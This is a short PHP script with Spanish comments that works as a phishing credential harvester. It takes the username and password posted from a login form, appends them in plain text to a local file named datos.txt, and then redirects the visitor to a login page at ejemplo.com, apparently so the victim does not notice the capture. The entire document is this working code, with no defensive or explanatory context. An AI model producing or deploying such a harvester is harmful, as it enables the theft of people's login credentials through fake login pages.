<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $usuario = $_POST['usuario'];
    $password = $_POST['password'];

    // Guardar en archivo
    $archivo = fopen("datos.txt", "a");
    fwrite($archivo, "Usuario: $usuario | Contraseña: $password\n");
    fclose($archivo);

    // Redirigir a otra página
    header("Location: https://ejemplo.com/login");
    exit();
}
?>
